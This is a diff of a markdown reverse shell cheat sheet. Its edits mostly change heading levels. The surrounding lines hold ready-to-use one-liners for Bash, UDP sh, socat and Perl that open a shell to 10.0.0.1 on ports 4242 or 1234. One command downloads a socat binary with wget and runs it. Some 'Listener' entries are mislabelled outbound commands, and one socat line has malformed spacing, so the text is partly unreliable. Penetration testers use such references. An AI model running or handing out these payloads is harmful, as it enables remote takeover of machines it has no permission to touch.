@@ -1,14 +1,14 @@
-# Reverse Shell | Cheat Sheet
+# Reverse Shell [Cheat Sheet]
 
-## Bourne-Again Shell
-### Transmission Control Protocol
-#### Remote Host
+# Bourne-Again Shell
+## Transmission Control Protocol
+### Remote Host
 ```
 bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
 
 0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
 ```
-#### Listener
+### Listener
 ```
 /bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
 ```
@@ -24,21 +24,21 @@ sh -i >& /dev/udp/10.0.0.1/4242 0>&1
 ```
 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
 ```
-#### Remote Host
+### Remote Host
 ```
 /tmp/socat exec:'bash -li', pty, stderr, setsid, sigint, sane tcp:10.0.0.1:4242
 ```
-#### Listener
+### Listener
 ```
 socat file:`tty`, raw, echo=0 TCP-L:4242
 ```
 
 ## Perl
-#### Remote Host
+### Remote Host
 ```
 perl -e 'use Socket; $IP="10.0.0.1"; $PORT=1234; socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp")); if(connect(S, sockaddr_in($PORT, inet_aton($IP)))){open(STDIN, ">&S"); open(STDOUT, ">&S"); open(STDERR, ">&S"); exec("/bin/sh -i");};'
 ```
-#### Listener
+### Listener
 ```
 perl -MIO -e '$PORT=fork; exit, if($PORT);$c=new IO::Socket::INET(PeerAddr, "10.0.0.1:1234"); STDIN->fdopen($c, r); $~->fdopen($c, w); system$_ while<>;'
 
